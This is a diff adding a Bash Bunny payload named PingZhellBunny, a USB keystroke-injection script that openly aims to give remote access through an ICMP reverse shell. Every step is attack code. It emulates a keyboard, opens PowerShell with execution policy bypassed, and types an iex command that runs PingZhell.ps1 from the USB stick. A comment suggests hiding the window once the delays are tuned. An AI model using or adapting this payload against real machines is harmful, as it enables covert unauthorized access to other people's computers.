@@ -1,0 +1,39 @@
+#!/bin/bash
+#
+# Title:         PingZhellBunny
+# Description:   Get remote access using a icmp reverse shell.
+# Author:        0iphor13
+# Version:       1.3
+# Category:      Remote_Access
+# Attackmodes:   HID, Storage
+
+LED SETUP
+
+DELAY 500
+
+GET SWITCH_POSITION
+DUCKY_LANG de
+
+DELAY 500
+
+ATTACKMODE HID STORAGE
+
+#LED STAGE1 - DON'T EJECT - PAYLOAD RUNNING
+
+LED STAGE1
+
+#After you have adapted the delays for your target, add "-W hidden"
+DELAY 5000
+RUN WIN "powershell -Exec Bypass -NoP -NonI"
+DELAY 6000
+Q ENTER
+
+DELAY 20000
+Q STRING "iex((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\PingZhell.ps1')"
+DELAY 20000
+Q ENTER
+DELAY 15000
+
+ATTACKMODE HID
+
+LED FINISH
